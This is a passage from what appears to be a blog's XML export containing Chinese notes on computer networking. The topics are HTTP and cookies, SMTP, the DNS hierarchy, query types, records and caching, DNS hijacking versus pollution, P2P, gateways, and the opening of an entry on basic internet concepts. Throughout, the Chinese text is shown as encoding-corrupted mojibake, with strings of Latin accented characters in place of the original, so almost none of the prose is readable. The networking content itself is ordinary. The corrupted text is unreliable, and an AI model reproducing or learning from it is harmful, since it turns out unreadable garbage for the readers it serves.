<li>æœåŠ¡å™¨æ”¶åˆ° HTTP è¯·æ±‚æŠ¥æ–‡å¹¶ç”Ÿæˆç›¸åº”çš„å“åº”æŠ¥æ–‡ï¼Œé€šè¿‡æœåŠ¡å™¨çš„<code>å¥—æ¥å­—</code>å‘é€å“åº”æŠ¥æ–‡ã€‚</li>
<li>å®¢æˆ·ç«¯ä»<code>å¥—æ¥å­—</code>æ¥å—å“åº”æŠ¥æ–‡ã€‚</li>
<li>æ‰€æœ‰æŠ¥æ–‡ä¼ è¾“ç»“æŸï¼Œå…³é—­ TCP è¿æ¥ã€‚</li>
</ol>
<h4 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h4><p>HTTP æ˜¯æ— çŠ¶æ€åè®®ï¼Œä¸è®°å½•å®¢æˆ·ç«¯çš„å†å²è¡Œä¸ºï¼Œæ¢è¨€ä¹‹å¯¹æœåŠ¡å™¨è€Œè¨€æ¯ä¸ª HTTP è¯·æ±‚éƒ½æ˜¯ç‹¬ç«‹çš„ï¼Œä¸å’Œå†å²è¯·æ±‚æœ‰ä»»ä½•å…³ç³»ã€‚ä¸ºäº†è¾¨åˆ«ç”¨æˆ·èº«ä»½ï¼Œç»´æŒ sessionï¼Œcookie åº”è¿è€Œç”Ÿï¼Œå®ƒæ˜¯ä¸€å°æ®µå‚¨å­˜åœ¨å®¢æˆ·ç«¯ä¸”é€šå¸¸ç»è¿‡åŠ å¯†çš„æ•°æ®ã€‚</p>
<p>Cookie åœ¨ HTTP åè®®ä¸­ä»¥å¤´éƒ¨è¡Œçš„å½¢å¼ä¼ è¾“ï¼Œç”±æœåŠ¡å™¨è®¾ç½®ï¼Œè¢«å®¢æˆ·ç«¯ï¼ˆé€šå¸¸æ˜¯æµè§ˆå™¨ï¼‰ä¿å­˜åœ¨æœ¬åœ°ã€‚</p>
<p><img src="https://i.loli.net/2020/01/20/wvu6zqyA9rKFDib.png" alt="CookieåŸç†"></p>
<h3 id="SMTP"><a href="#SMTP" class="headerlink" title="SMTP"></a>SMTP</h3><p>é€šè¿‡ SMTPï¼ˆç®€å•é‚®ä»¶ä¼ è¾“åè®®ï¼‰å®ç°å‘é€é‚®ä»¶ã€‚å› ç‰¹ç½‘ç”µå­é‚®ä»¶ç³»ç»Ÿç”± 3 éƒ¨åˆ†ç»„æˆï¼š</p>
<ul>
<li>ç”¨æˆ·ä»£ç†ã€‚å¸¸è§çš„é‚®ä»¶å®¢æˆ·ç«¯å¦‚ Outlook ç­‰éƒ½æ˜¯ç”¨æˆ·ä»£ç†ï¼Œå¦‚æœæ˜¯é€šè¿‡ Web ç«¯å‘é€é‚®ä»¶ï¼Œé‚£ä¹ˆæµè§ˆå™¨æ˜¯ç”¨æˆ·ä»£ç†ã€‚ç”¨æˆ·ä»£ç†è´Ÿè´£è¯»å†™é‚®ä»¶ã€ä¸é‚®ä»¶æœåŠ¡å™¨äº¤äº’</li>
<li>é‚®ä»¶æœåŠ¡å™¨ã€‚é€šå¸¸ç”±ä¼ä¸šæä¾›ï¼Œå¦‚ QQ é‚®ç®±çš„æœåŠ¡å™¨<code>smtp.qq.com</code>ï¼Œ126 é‚®ç®±æœåŠ¡å™¨<code>smtp.126.com</code></li>
<li>SMTPã€‚è´Ÿè´£åœ¨é‚®ä»¶æœåŠ¡å™¨ä¹‹é—´å‘é€é‚®ä»¶</li>
</ul>
<p>ä¸€ä¸ªå…¸å‹çš„å‘é€é‚®ä»¶çš„è¿‡ç¨‹æ˜¯ï¼š</p>
<ol>
<li>ä»å‘é€æ–¹çš„ç”¨æˆ·ä»£ç†å¼€å§‹ï¼Œä¼ è¾“åˆ°å‘é€æ–¹çš„é‚®ä»¶æœåŠ¡å™¨</li>
<li>ä»å‘é€æ–¹çš„é‚®ä»¶æœåŠ¡å™¨å‘åˆ°æ¥æ”¶æ–¹çš„é‚®ä»¶æœåŠ¡å™¨ï¼Œç„¶åè¢«åˆ†å‘åˆ°æ¥æ”¶æ–¹çš„é‚®ç®±ä¸­</li>
<li>æ¥æ”¶æ–¹é€šè¿‡ç”¨æˆ·ä»£ç†ä»é‚®ç®±è·å–é‚®ä»¶</li>
</ol>
<p>SMTP æ˜¯å› ç‰¹ç½‘ç”µå­åè®®ä¸­çš„ä¸»è¦åº”ç”¨å±‚åè®®ï¼Œå®ƒç”¨ TCP æä¾›å¯é æ•°æ®ä¼ è¾“æœåŠ¡ã€‚</p>
<p>SMTP è§„å®šé‚®ä»¶æŠ¥æ–‡é¦–éƒ¨å¿…é¡»åŒ…å«å…³é”®å­—<code>From:</code>ä¸<code>To:</code>ï¼Œå¯ä»¥åŒ…å«å…³é”®å­—<code>Subject:</code>ã€‚</p>
<h3 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h3><p>å¦‚æœæŠŠå®¢æˆ·å‘æœåŠ¡å™¨å‘é€æŠ¥æ–‡æ¯”ä½œæ‰“ç”µè¯ï¼Œé‚£ä¹ˆæœåŠ¡å™¨çš„IPåœ°å€æ˜¯ç”µè¯å·ç ï¼ŒåŸŸåæ˜¯å·ç ä¸»äººçš„å§“åï¼Œè€Œ DNSï¼ˆDomain Name System åŸŸåç³»ç»Ÿï¼‰å°±æ˜¯ç”µè¯ç°¿ï¼ŒæŠŠå§“åå’Œç”µè¯å·ç è”ç³»èµ·æ¥ã€‚</p>
<p>DNSæ˜¯ï¼š</p>
<ol>
<li>ä¸€ä¸ªç”±åˆ†å±‚çš„DNSæœåŠ¡å™¨å®ç°çš„åˆ†å¸ƒå¼æ•°æ®åº“</li>
<li>ä¸€ä¸ªä½¿ä¸»æœºèƒ½å¤ŸæŸ¥è¯¢åˆ†å¸ƒå¼æ•°æ®åº“çš„åº”ç”¨å±‚åè®®</li>
</ol>
<p>DNSæä¾›çš„æœåŠ¡æœ‰ï¼š</p>
<ul>
<li>åŸŸåè§£ææœåŠ¡</li>
<li>ä¸»æœºåˆ«åæœåŠ¡</li>
<li>é‚®ä»¶æœåŠ¡å™¨åˆ«åæœåŠ¡</li>
<li>è´Ÿè½½å‡è¡¡ã€‚å°†ä¸€ä¸ªåŸŸåä¸å¤šä¸ªIPåœ°å€å¯¹åº”èµ·æ¥ï¼Œå½“å®¢æˆ·å¯¹åŸŸåå‘å‡ºä¸€ä¸ªDNSè¯·æ±‚æ—¶ï¼Œæ¯æ¬¡å“åº”éƒ½å¾ªç¯<br>è¿™äº›IPåœ°å€çš„æ¬¡åºã€‚ç”±äºå®¢æˆ·æ€»æ˜¯å‘æ’åœ¨æœ€å‰é¢çš„IPåœ°å€å‘é€HTTPè¯·æ±‚ï¼Œç”±æ­¤å®ç°äº†è´Ÿè½½å‡è¡¡ã€‚</li>
</ul>
<p>è·å¾—ä¸€ä¸ªåŸŸåçš„ IP åœ°å€çš„è¿‡ç¨‹å¦‚ä¸‹ï¼š</p>
<ol>
<li>æµè§ˆå™¨æŠŠåŸŸåå‘é€åˆ°ç”¨æˆ·ä¸»æœºä¸Šçš„DNSå®¢æˆ·ç«¯ </li>
<li>DNS å®¢æˆ·ç«¯å‘ DNS æœåŠ¡å™¨å‘é€ä¸€ä¸ªåŒ…å«ä¸»æœºåçš„è¯·æ±‚</li>
<li>DNS æœåŠ¡å™¨é€šè¿‡æŸ¥è¯¢ç›¸åº”çš„åŸŸåâ€”â€”&gt; I åœ°å€é—´çš„æ˜ å°„å…³ç³»ï¼Œç”Ÿæˆä¸€ä¸ªå“åº”æŠ¥æ–‡å¹¶è¿”å›</li>
<li>DNS å®¢æˆ·ç«¯æ”¶åˆ°å“åº”æŠ¥æ–‡ï¼ŒæŠŠæŠ¥æ–‡ä¸­çš„IPåœ°å€ä¼ ç»™æµè§ˆå™¨</li>
</ol>
<h4 id="å®è´¨"><a href="#å®è´¨" class="headerlink" title="å®è´¨"></a>å®è´¨</h4><p>å¤šå±‚å‘½åæœåŠ¡å™¨æ„æˆçš„<strong>åˆ†å¸ƒå¼</strong>æ•°æ®åº“ã€‚å±äºåº”ç”¨å±‚åè®®ï¼Œè´Ÿè´£åŸŸåè§£æåŠŸèƒ½ã€‚  </p>
<h4 id="åˆ†å±‚å¼å±‚æ¬¡å¼æ•°æ®åº“"><a href="#åˆ†å±‚å¼å±‚æ¬¡å¼æ•°æ®åº“" class="headerlink" title="åˆ†å±‚å¼å±‚æ¬¡å¼æ•°æ®åº“"></a>åˆ†å±‚å¼å±‚æ¬¡å¼æ•°æ®åº“</h4><p>ç¬¬ä¸€å±‚ï¼šæ ¹åŸŸåæœåŠ¡å™¨ï¼ˆrootï¼‰</p>
<p>ç¬¬äºŒå±‚ï¼šé¡¶çº§åŸŸåæœåŠ¡å™¨ï¼ˆtop-level domainï¼ŒTLDï¼‰ï¼Œè´Ÿè´£ comï¼Œorgï¼Œcnï¼Œjp ç­‰</p>
<p>ç¬¬ä¸‰å±‚ï¼šæƒå¨åŸŸåæœåŠ¡å™¨ï¼ˆauthoritativeï¼‰ï¼Œè´Ÿè´£ç»„ç»‡åŸŸåè§£æï¼Œå¦‚ alibabaï¼Œbaidu ç­‰</p>
<p><img src="https://i.loli.net/2019/12/21/gXAveHhuimtyWl5.png" alt="åˆ†å±‚ç»“æ„"></p>
<p>ä¸¾ä¸ªä¾‹å­ï¼šå®¢æˆ·ç«¯è®¿é—® <a href="www.baidu.com">www.baidu.com</a>ã€‚</p>
<ol>
<li>å‘æ ¹åŸŸåæœåŠ¡å™¨å‘é€æŸ¥è¯¢è¯·æ±‚ã€‚æ ¹åŸŸåæœåŠ¡å™¨è¿”å› com åŸŸåæœåŠ¡å™¨åœ°å€ã€‚</li>
<li>å‘ com åŸŸåæœåŠ¡å™¨å‘é€æŸ¥è¯¢è¯·æ±‚ã€‚com åŸŸåæœåŠ¡å™¨è¿”å› baidu.com åŸŸåæœåŠ¡å™¨åœ°å€ã€‚</li>
<li>å‘ baidu.com åŸŸåæœåŠ¡å™¨å‘é€æŸ¥è¯¢è¯·æ±‚ã€‚baidu.com åŸŸåæœåŠ¡å™¨è¿”å› w<a href="http://www.baidu.com/">www.baidu.com</a> åœ°å€ã€‚</li>
</ol>
<p><strong>æœ¬åœ°åŸŸåæœåŠ¡å™¨ï¼š</strong> ä¸ä¸¥æ ¼å±äºå±‚çº§ä½“ç³»ï¼Œæ¯ä¸ª ISP æœ‰ä¸€ä¸ªæœ¬åœ°åŸŸåæœåŠ¡å™¨ï¼Œæ˜¯è¯¥ ISP ç”¨æˆ·çš„é»˜è®¤åŸŸåè§£ææœåŠ¡å™¨ã€‚ä½œä¸ºä»£ç†å°†è¯¥ ISP ç”¨æˆ·çš„æŸ¥è¯¢è½¬å‘ç»™åŸŸåè§£ææœåŠ¡å™¨ç³»ç»Ÿã€‚</p>
<h4 id="ä¸ºä»€ä¹ˆä¸ç”¨é‡‡ç”¨é›†ä¸­å¼æ¶æ„"><a href="#ä¸ºä»€ä¹ˆä¸ç”¨é‡‡ç”¨é›†ä¸­å¼æ¶æ„" class="headerlink" title="ä¸ºä»€ä¹ˆä¸ç”¨é‡‡ç”¨é›†ä¸­å¼æ¶æ„"></a>ä¸ºä»€ä¹ˆä¸ç”¨é‡‡ç”¨é›†ä¸­å¼æ¶æ„</h4><ul>
<li>å•ç‚¹å¤±è´¥é—®é¢˜</li>
<li>æµé‡é—®é¢˜</li>
<li>è·ç¦»é—®é¢˜</li>
<li>ç»´æŠ¤æ€§é—®é¢˜</li>
</ul>
<p>ä¸å¯ä¼¸ç¼©ï¼</p>
<h4 id="DNS-æŸ¥è¯¢æ–¹å¼"><a href="#DNS-æŸ¥è¯¢æ–¹å¼" class="headerlink" title="DNS æŸ¥è¯¢æ–¹å¼"></a>DNS æŸ¥è¯¢æ–¹å¼</h4><ul>
<li><p>è¿­ä»£æŸ¥è¯¢ã€‚ç”¨æˆ·çš„æŸ¥è¯¢è¢«è½¬å‘åˆ°æœ¬åœ°åŸŸåæœåŠ¡å™¨ä¸Šï¼Œæœ¬åœ°åŸŸåæœåŠ¡å™¨ä¾æ¬¡è®¿é—® 3 å±‚åŸŸåè§£ææœåŠ¡å™¨ç³»ç»Ÿã€‚</p>
</li>
<li><p>é€’å½’æŸ¥è¯¢ã€‚ç”¨æˆ·çš„æŸ¥è¯¢è¢«è½¬å‘åˆ°æœ¬åœ°åŸŸåæœåŠ¡å™¨ä¸Šï¼Œæœ¬åœ°åŸŸåæœåŠ¡å™¨è®¿é—®æ ¹åŸŸåæœåŠ¡å™¨ï¼Œæ ¹åŸŸåæœåŠ¡å™¨è®¿é—®é¡¶çº§åŸŸåæœåŠ¡å™¨ï¼Œé¡¶çº§åŸŸåæœåŠ¡å™¨è®¿é—®æƒå¨åŸŸåæœåŠ¡å™¨ã€‚æœ€åçš„æŸ¥è¯¢ç»“æœä¾æ¬¡è¿”å›ç»™ä¸Šä¸€å±‚ã€‚</p>
</li>
</ul>
<h4 id="DNS-ç¼“å­˜ä¸æ›´æ–°"><a href="#DNS-ç¼“å­˜ä¸æ›´æ–°" class="headerlink" title="DNS ç¼“å­˜ä¸æ›´æ–°"></a>DNS ç¼“å­˜ä¸æ›´æ–°</h4><p>ä¸€æ®µæ—¶é—´åï¼Œç¼“å­˜æ¡ç›®ä¼šå¤±æ•ˆã€‚æœ¬åœ°åŸŸåæœåŠ¡å™¨ä¸€èˆ¬ä¼šç¼“å­˜é¡¶çº§åŸŸåæœåŠ¡å™¨åœ°å€ï¼Œæ‰€ä»¥æ ¹åŸŸåæœåŠ¡å™¨è¾ƒå°‘è¢«è®¿é—®ã€‚</p>
<h4 id="DNS-è®°å½•ä¸æ ¼å¼"><a href="#DNS-è®°å½•ä¸æ ¼å¼" class="headerlink" title="DNS è®°å½•ä¸æ ¼å¼"></a>DNS è®°å½•ä¸æ ¼å¼</h4><p>DNS è®°å½•åˆç§°èµ„æºè®°å½•ï¼ˆRRï¼ŒResource Recordï¼‰ã€‚æ˜¯ä¸€ä¸ªå››å…ƒç»„ï¼š<strong>ï¼ˆnameï¼Œvalueï¼Œtypeï¼Œttlï¼‰</strong>ã€‚</p>
<ul>
<li>type=Aï¼šname=ä¸»æœºåŸŸåï¼Œvalue=IP åœ°å€ã€‚</li>
<li>type=NSï¼šname=åŸŸï¼ˆedu.cnã€qiuyueqy.comï¼‰ï¼Œvalue=è¯¥åŸŸçš„æƒå¨åŸŸåè§£ææœåŠ¡å™¨çš„ä¸»æœºåŸŸåã€‚</li>
<li>type=CNAMEï¼šname=æŸçœŸå®åŸŸåçš„åˆ«åï¼Œvalue=çœŸå®åŸŸåã€‚</li>
<li>type=MXï¼šname=åŸŸï¼ˆ126.comï¼Œ163.comï¼‰,value=ä¸nameå¯¹åº”çš„é‚®ä»¶æœåŠ¡å™¨.</li>
</ul>
<h4 id="ä¸ºä»€ä¹ˆåœ¨åº”ç”¨å±‚å®ç°"><a href="#ä¸ºä»€ä¹ˆåœ¨åº”ç”¨å±‚å®ç°" class="headerlink" title="ä¸ºä»€ä¹ˆåœ¨åº”ç”¨å±‚å®ç°"></a>ä¸ºä»€ä¹ˆåœ¨åº”ç”¨å±‚å®ç°</h4><p>æˆ‘ä»¬å¸Œæœ›æŠŠå¤æ‚çš„ä¸œè¥¿å°½é‡æ”¾åœ¨ç«¯ç³»ç»Ÿå®ç°ã€‚åœ¨åº”ç”¨å±‚å®ç° DNS åè®®æœ‰åˆ©äºé™ä½ç½‘ç»œæ ¸å¿ƒçš„å¤æ‚åº¦ã€‚</p>
<h4 id="DNSç¼“å­˜"><a href="#DNSç¼“å­˜" class="headerlink" title="DNSç¼“å­˜"></a>DNSç¼“å­˜</h4><p>ç”±ä¸Šå¯çŸ¥ï¼Œä¸ºäº†è·å–ä¸€ä¸ªDNSåœ°å€è¿›è¡Œäº†å¾ˆå¤šæ¬¡è¯·æ±‚ï¼Œè¿™å°±å½±å“äº†é€Ÿåº¦ã€‚ä¸ºäº†åŠ å¿«å“åº”é€Ÿåº¦ï¼ŒDNSæœåŠ¡å™¨æœ‰ç¼“å­˜æœºåˆ¶ï¼šåœ¨ä¸€ä¸ªè¯·æ±‚é“¾ä¸­ï¼Œå½“æŸDNSæœåŠ¡å™¨æ¥æ”¶åˆ°ä¸€ä¸ªDNSå›ç­”ï¼Œå®ƒèƒ½å°†è¯¥å›ç­”ä¸­çš„ä¿¡æ¯ç¼“å­˜åˆ°æœ¬åœ°å­˜å‚¨å™¨ä¸­ï¼Œç±»ä¼¼äºWebç¼“å­˜å™¨ã€‚åœ¨ä¸€æ®µæ—¶é—´ï¼ˆé»˜è®¤ä¸ºä¸¤å¤©ï¼‰åå°†ç¼“å­˜ä¿¡æ¯ä¸¢å¼ƒã€‚</p>
<h4 id="DNSåŠ«æŒä¸æ±¡æŸ“"><a href="#DNSåŠ«æŒä¸æ±¡æŸ“" class="headerlink" title="DNSåŠ«æŒä¸æ±¡æŸ“"></a>DNSåŠ«æŒä¸æ±¡æŸ“</h4><p>DNS æ±¡æŸ“æ˜¯æŒ‡æœåŠ¡å™¨æ£€æµ‹åˆ°ç”¨æˆ·è®¿é—®ç‰¹å®šçš„ä¸»æœºæ—¶ï¼Œä¼ªè£…æˆ DNS æœåŠ¡å™¨å‘ç”¨æˆ·è¿”å›é”™è¯¯IPåœ°å€ã€‚å›½å†…ç”¨æˆ·è®¿é—® youtube ç­‰ç½‘ç«™æ—¶å°±ä¼šé‡åˆ°è¿™ç§æƒ…å†µ</p>
<p>DNS åŠ«æŒæ˜¯é€šè¿‡åŠ«æŒç‰¹å®šçš„DNSæœåŠ¡å™¨ï¼Œåœ¨ DNS æœåŠ¡å™¨é‡Œå­˜æ”¾é”™è¯¯çš„ç¼“å­˜ä¿¡æ¯ï¼Œè¿™æ · DNS æœåŠ¡å™¨å°±ä¼šå‘ç”¨æˆ·è¿”å›é”™è¯¯çš„ IP åœ°å€</p>
<p>å¯¹äº DNS åŠ«æŒï¼Œå¯ç”¨é‡‡ç”¨æ›´æ¢é»˜è®¤ DNS æœåŠ¡å™¨çš„æ–¹å¼è§£å†³ã€‚è€Œ DNS æ±¡æŸ“åªèƒ½é€šè¿‡ä¿®æ”¹ hosts æ–‡ä»¶ã€VPN ç­‰æ–¹å¼ç»•è¿‡æœåŠ¡å™¨</p>
<h3 id="P2P"><a href="#P2P" class="headerlink" title="P2P"></a>P2P</h3><p>P2Pï¼ˆPeer to Peerï¼‰åº”ç”¨çš„å‡ ä¸ªç‰¹ç‚¹ï¼š</p>
<ul>
<li>æ²¡æœ‰æœåŠ¡å™¨</li>
<li>ä»»æ„ç«¯ç³»ç»Ÿä¹‹é—´ç›´æ¥äº’è”</li>
<li>èŠ‚ç‚¹é˜¶æ®µæ€§æ¥å…¥Intent</li>
<li>èŠ‚ç‚¹å¯èƒ½æ›´æ¢IPåœ°å€</li>
</ul>
<h3 id="ç½‘å…³-gateway"><a href="#ç½‘å…³-gateway" class="headerlink" title="ç½‘å…³(gateway)"></a>ç½‘å…³(gateway)</h3><p>åœ¨ä¸€ä¸ªå±€åŸŸç½‘å†…äº’ç›¸é€šä¿¡æ˜¯ä¸éœ€è¦ç”¨åˆ°ç½‘å…³çš„ï¼Œè€Œå±€åŸŸç½‘å†…çš„æ¥å£è¦è®¿é—®å¤–ç½‘æ—¶ï¼Œåˆ™éœ€è¦æŠŠè¯·æ±‚å‘é€åˆ°ç½‘å…³ä¸Šï¼Œç”±ç½‘å…³è´Ÿè´£å‘å¤–å‘é€æµé‡ã€‚åŒç†ï¼Œå¤–ç½‘çš„ä¿¡æ¯ä¹Ÿæ˜¯é€šè¿‡ç½‘å…³å†ä¼ è¾¾ç»™å†…ç½‘æ¥å£</p>
]]></content>
      <categories>
        <category>è®¡ç®—æœºç½‘ç»œ</category>
      </categories>
      <tags>
        <tag>åº”ç”¨å±‚</tag>
      </tags>
  </entry>
  <entry>
    <title>ç½‘ç»œé‚£äº›äº‹ä¹‹åŸºæœ¬æ¦‚å¿µ</title>
    <url>/2018/06/04/%E7%BD%91%E7%BB%9C%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/</url>
    <content><![CDATA[<p>è®¡ç®—æœºç½‘ç»œæ˜¯ä¸€ä¸ªè‡ªæ²»çš„ã€äº’è”çš„è®¡ç®—æœºé›†åˆã€‚</p>
<span id="more"></span>

<h2 id="å› ç‰¹ç½‘"><a href="#å› ç‰¹ç½‘" class="headerlink" title="å› ç‰¹ç½‘"></a>å› ç‰¹ç½‘</h2><p>å› ç‰¹ç½‘æ˜¯ä¸€ä¸ªä¸–ç•ŒèŒƒå›´çš„è®¡ç®—æœºç½‘ç»œï¼Œæ˜¯â€œç½‘ç»œçš„ç½‘ç»œâ€ã€‚ç”±åå¤šä¸ªç¬¬ä¸€å±‚<code>ISP(å› ç‰¹ç½‘æœåŠ¡æä¾›å•†)</code>å’Œæ•°åä¸‡ä¸ªåº•å±‚ ISP ç»„æˆã€‚ISP è¦†ç›–åŒºåŸŸæœ‰æ‰€ä¸åŒï¼Œæœ‰äº›è·¨è¶Šå¤šä¸ªå¤§æ´²å’Œå¤§æ´‹ï¼Œæœ‰äº›é™äºå¾ˆå°çš„åœ°ç†åŒºåŸŸã€‚ä½å±‚ ISP ä¸é«˜å±‚ ISP äº’è”ï¼Œé«˜å±‚ISPå½¼æ­¤äº’è”ã€‚</p>
<h2 id="ç«¯ç³»ç»Ÿ"><a href="#ç«¯ç³»ç»Ÿ" class="headerlink" title="ç«¯ç³»ç»Ÿ"></a>ç«¯ç³»ç»Ÿ</h2><p>æ‰€æœ‰è¿æ¥åˆ°å› ç‰¹ç½‘çš„è®¾å¤‡éƒ½ç§°ä¸º<code>ä¸»æœº</code>æˆ–<code>ç«¯ç³»ç»Ÿ</code>ã€‚</p>
<p>ç«¯ç³»ç»Ÿé€šè¿‡<code>é€šä¿¡é“¾è·¯</code>å’Œ<code>åˆ†ç»„äº¤æ¢æœº</code>è¿æ¥åˆ°ä¸€èµ·ã€‚é€šä¿—çš„è®²é€šä¿¡é“¾è·¯å°±æ˜¯ä¸€æ¡æ¡å…‰ç¼†ã€ç½‘çº¿ç­‰ç‰©ç†çº¿è·¯ï¼Œä¸åŒçš„é“¾è·¯èƒ½ä»¥ä¸åŒçš„é€Ÿç‡ä¼ è¾“æ•°æ®ï¼Œé“¾è·¯çš„ä¼ è¾“é€Ÿç‡å•ä½ä¸º<code>bit/sæˆ–bps</code>ï¼Œå³<code>æ¯”ç‰¹/ç§’</code>ã€‚ç«¯ç³»ç»Ÿé€šè¿‡ ISP æ¥å…¥å› ç‰¹ç½‘ã€‚</p>
<p>å½“ä¸€å°ç«¯ç³»ç»Ÿå‘å¦ä¸€å°ç«¯ç³»ç»Ÿå‘é€æ•°æ®æ—¶ï¼Œå‘é€ç«¯ç³»ç»Ÿå°†æ•°æ®å°†æ•°æ®åˆ†æ®µï¼Œå¹¶ä¸ºæ¯æ®µåŠ ä¸Šé¦–éƒ¨å­—èŠ‚ã€‚ç”±æ­¤å½¢æˆçš„ä¿¡æ¯åŒ…ç§°ä¸º<code>åˆ†ç»„</code>ã€‚è¿™äº›åˆ†ç»„é€šè¿‡ç½‘ç»œå‘é€åˆ°ç›®çš„ç«¯ç³»ç»Ÿï¼Œåœ¨é‚£é‡Œè¢«è£…é…æˆåˆå§‹æ•°æ®ã€‚åˆ†ç»„äº¤æ¢æœºä»å®ƒçš„ä¸€æ¡å…¥é€šä¿¡é“¾è·¯æ¥æ”¶åˆ°è¾¾çš„åˆ†ç»„ï¼Œå¹¶ä»å®ƒçš„ä¸€æ¡å‡ºé€šä¿¡é“¾è·¯è½¬å‘è¯¥åˆ†ç»„ã€‚ç›®å‰æœ€å‡ºåçš„ä¸¤ç§åˆ†ç»„äº¤æ¢æœºç±»å‹æ˜¯<code>è·¯ç”±å™¨</code>å’Œ<code>é“¾è·¯å±‚äº¤æ¢æœº</code>ã€‚è¿™ä¸¤ç§ç±»å‹çš„äº¤æ¢æœºæœç€æœ€ç»ˆçš„ç›®çš„åœ°è½¬å‘åˆ†ç»„ã€‚é“¾è·¯å±‚äº¤æ¢æœºå¸¸ç”¨äºæ¥å…¥ç½‘ä¸­ï¼Œè€Œè·¯ç”±å™¨å¸¸ç”¨äºç½‘ç»œæ ¸å¿ƒä¸­ã€‚ä»å‘é€ç«¯åˆ°æ¥æ”¶ç«¯ï¼Œä¸€ä¸ªåˆ†ç»„æ‰€ç»å†çš„ä¸€ç³»åˆ—é€šä¿¡é“¾è·¯å’Œåˆ†ç»„äº¤æ¢æœºç§°ä¸ºé€šè¿‡è¯¥ç½‘ç»œçš„<code>è·¯å¾„</code>ã€‚</p>
<p>ä¸å› ç‰¹ç½‘ç›¸è¿çš„ç«¯ç³»ç»Ÿæä¾›äº†<code>åº”ç”¨ç¨‹åºç¼–ç¨‹æ¥å£(API)</code>,è¯¥APIè§„å®šäº†è¿è¡Œåœ¨ä¸€ä¸ªç«¯ç³»ç»Ÿä¸Šçš„è½¯ä»¶è¯·æ±‚å› ç‰¹ç½‘åŸºç¡€è®¾æ–½å‘è¿è¡Œåœ¨å¦ä¸€ä¸ªç«¯ç³»ç»Ÿä¸Šçš„ç‰¹å®šç›®çš„åœ°è½¯ä»¶äº¤ä»˜æ•°æ®çš„æ–¹å¼ã€‚å› ç‰¹ç½‘APIæ˜¯ä¸€å¥—å‘é€è½¯ä»¶å¿…é¡»éµå¾ªçš„è§„åˆ™é›†åˆã€‚ç±»ä¼¼äºæˆ‘ä»¬åœ¨å¯„ä¿¡çš„æ—¶å€™éœ€è¦éµé‚®å±€çš„è§„å®šè´´ä¸Šé‚®ç¥¨ã€å†™ä¸Šé‚®æ”¿ç¼–ç ç­‰ï¼Œè¿™äº›è§„å®šå°±æ˜¯ APIã€‚</p>
<h2 id="ç½‘ç»œè¾¹ç¼˜"><a href="#ç½‘ç»œè¾¹ç¼˜" class="headerlink" title="ç½‘ç»œè¾¹ç¼˜"></a>ç½‘ç»œè¾¹ç¼˜</h2><p>å¸¸æŠŠä¸å› ç‰¹ç½‘ç›¸è¿çš„è®¾å¤‡ç§°ä¸ºç«¯ç³»ç»Ÿï¼Œå› ä¸ºå®ƒä»¬ä½äºç½‘ç»œçš„è¾¹ç¼˜ã€‚å°†ç«¯ç³»ç»Ÿè¿æ¥åˆ°å…¶<code>è¾¹ç¼˜è·¯ç”±å™¨</code>çš„ç‰©ç†é“¾è·¯ç§°ä¸º<code>æ¥å…¥ç½‘</code>ã€‚<code>è¾¹ç¼˜è·¯ç”±å™¨</code>æ˜¯ç«¯ç³»ç»Ÿåˆ°ä»»ä½•å…¶ä»–è¿œç¨‹ç³»ç»Ÿçš„è·¯å¾„ä¸Šçš„ç¬¬ä¸€å°è·¯ç”±å™¨ã€‚<br>é™¤äº†ç«¯ç³»ç»Ÿå¤–ï¼Œ<code>ç½‘ç»œåº”ç”¨</code>ä¹Ÿå¤„äºç½‘ç»œè¾¹ç¼˜ã€‚ç½‘ç»œåº”ç”¨é€šå¸¸æœ‰ä¸¤ç§ç»“æ„ï¼š</p>
<ul>
<li>å®¢æˆ·â€”â€”æœåŠ¡å™¨ç»“æ„ï¼ˆClient-Serverï¼‰ã€‚å¸¸è§çš„ Web åº”ç”¨éƒ½æ˜¯è¿™ç§ç»“æ„ã€‚è¿™ç§åº”ç”¨çš„ç‰¹ç‚¹æ˜¯å®¢æˆ·åªä¸æœåŠ¡å™¨è¿›è¡Œäº¤äº’ï¼Œåªæœ‰å®¢æˆ·å¯ä»¥ä¸»åŠ¨å‘èµ·è¿æ¥ã€‚<strong>å®¢æˆ·ä¸å®¢æˆ·ä¹‹é—´æ˜¯äº’ä¸å¯è§çš„</strong></li>
<li>P2P ç»“æ„ï¼ˆç‚¹å¯¹ç‚¹ç»“æ„ï¼‰ã€‚è¿™ç§ç»“æ„æ˜¯å¯¹ç­‰çš„ï¼Œä¸å­˜åœ¨å®¢æˆ·å’ŒæœåŠ¡å™¨çš„æ¦‚å¿µã€‚å„ä¸ªç«¯ç‚¹ä¹‹é—´å¯ä»¥ç›´æ¥äº’ç›¸è®¿é—®ã€‚ä¾‹å­æœ‰æ–‡ä»¶å…±äº«æœåŠ¡å¦‚btä¸‹è½½ï¼Œæ‰€ä»¥æ‰ä¼šæœ‰<strong>è¶Šå¤šäººä¸‹è½½é€Ÿåº¦è¶Šå¿«</strong>çš„è¯´æ³•</li>
</ul>
<h3 id="å®¶åº­æ¥å…¥"><a href="#å®¶åº­æ¥å…¥" class="headerlink" title="å®¶åº­æ¥å…¥"></a>å®¶åº­æ¥å…¥</h3><p>å½“å‰å®½å¸¦ä½å®…æ¥å…¥æœ‰ä¸¤ç§æµè¡Œç±»å‹ï¼š</p>
<ul>
<li>æ•°å­—ç”¨æˆ·çº¿(Digital Subscriber Lineï¼ŒDSL)ã€‚å³å¸¸è¯´çš„æ‹¨å·ä¸Šç½‘ã€‚åˆ©ç”¨DSLè°ƒåˆ¶è§£è°ƒå™¨å°†åˆ°è¾¾å®¶åº­çš„æ•°æ®ä¿¡å·å’Œç”µè¯ä¿¡å·åˆ†éš”å¼€ï¼ˆADSLæ˜¯éå¯¹ç§°æ¥å…¥ï¼Œå³ä¸Šè¡Œä¸ä¸‹è¡Œé€Ÿç‡æ˜¯ä¸åŒçš„ï¼Œé€šå¸¸ä¸‹è¡Œæ›´å¿«ï¼‰</li>
